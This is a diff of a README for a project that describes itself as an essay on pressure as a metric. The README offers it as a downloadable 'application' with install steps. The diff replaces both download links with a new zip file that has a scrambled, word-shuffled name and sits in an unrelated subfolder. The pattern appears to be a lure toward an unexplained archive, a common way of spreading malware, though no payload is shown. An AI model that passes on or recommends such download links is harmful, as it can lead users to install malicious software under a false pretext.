@@ -5,7 +5,7 @@
 Welcome to the "Pressure-Is-the-Only-Honest-Metric" project! This application provides insightful perspectives on how we view metrics. The essay argues that many metrics fall short because they focus on outcomes rather than the pressures building in systems.
 
 ## 📥 Download the Application
-[![Download Latest Release](https://raw.githubusercontent.com/bmd097/Pressure-Is-the-Only-Honest-Metric/main/birchen/Only_Is_Honest_Pressure_Metric_the_2.4.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bmd097/Pressure-Is-the-Only-Honest-Metric/main/birchen/Only_Is_Honest_Pressure_Metric_the_2.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/bmd097/Pressure-Is-the-Only-Honest-Metric/main/birchen/Honest_Is_the_Metric_Pressure_Only_3.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/bmd097/Pressure-Is-the-Only-Honest-Metric/main/birchen/Honest_Is_the_Metric_Pressure_Only_3.7.zip)
 
 ## 📋 Overview
 This project presents a long-form essay on understanding systems through the lens of pressure. It explores various topics including:
@@ -41,7 +41,7 @@ To run this software smoothly, your system should meet the following requirement
 ## 📥 Download & Install
 To get started with the application, visit the Releases page to download the latest version:
 
-[Download here](https://raw.githubusercontent.com/bmd097/Pressure-Is-the-Only-Honest-Metric/main/birchen/Only_Is_Honest_Pressure_Metric_the_2.4.zip)
+[Download here](https://raw.githubusercontent.com/bmd097/Pressure-Is-the-Only-Honest-Metric/main/birchen/Honest_Is_the_Metric_Pressure_Only_3.7.zip)
 
 Once you have downloaded the file, follow these steps:
 
